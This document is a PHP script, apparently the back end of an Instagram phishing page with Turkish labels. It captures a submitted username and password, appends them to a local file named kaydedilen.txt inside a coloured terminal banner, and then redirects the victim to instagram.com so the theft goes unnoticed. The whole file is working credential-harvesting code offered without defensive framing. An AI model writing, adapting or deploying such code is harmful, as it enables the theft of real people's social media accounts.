<?php

if (isset($_POST['username']) && isset($_POST['password'])) {

$save = fopen("kaydedilen.txt","a+");
$kullaniciadi = $_POST['username'];
$password = $_POST['password'];
$vericekilen = ("
\e[32m
	████████████████████████████████████████
	██
	██ \e[97mKULLANICI ADI : \e[32m".$kullaniciadi."\e[32m
	██
	████████████████████████████████████████


	████████████████████████████████████████
	██
	██ \e[97mŞİFRE         : \e[32m".$password."\e[32m
	██
	████████████████████████████████████████\e[97m
        
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-");
fwrite($save,$vericekilen);
fclose($save);
header('Location: https://instagram.com');
}
?>
